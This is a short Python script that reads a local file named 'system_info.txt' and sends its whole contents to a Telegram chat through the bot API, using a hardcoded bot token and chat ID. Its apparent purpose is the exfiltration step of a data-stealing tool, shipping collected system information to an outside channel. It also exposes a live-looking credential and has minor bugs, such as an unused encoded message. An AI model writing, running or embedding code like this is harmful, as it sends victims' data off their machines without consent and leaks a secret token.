import requests
import urllib.parse

def telegram_bot_sendtext(bot_message):
    
    bot_token = '7020054266:AAFv9ZsW7GIxYjRvR6DsumRN0-DQRVJiQrA'
    bot_chatID = '-4140487099'
    encoded_message = urllib.parse.quote_plus(bot_message)
    send_text = send_text = f'https://api.telegram.org/bot{bot_token}/sendMessage?chat_id={bot_chatID}&parse_mode=HTML&text={bot_message}'

    response = requests.get(send_text)

    return response.json()
    
with open('system_info.txt', 'r') as file:
    salam = file.read()

# Send the file content as a message
response = telegram_bot_sendtext(salam)
print(response)


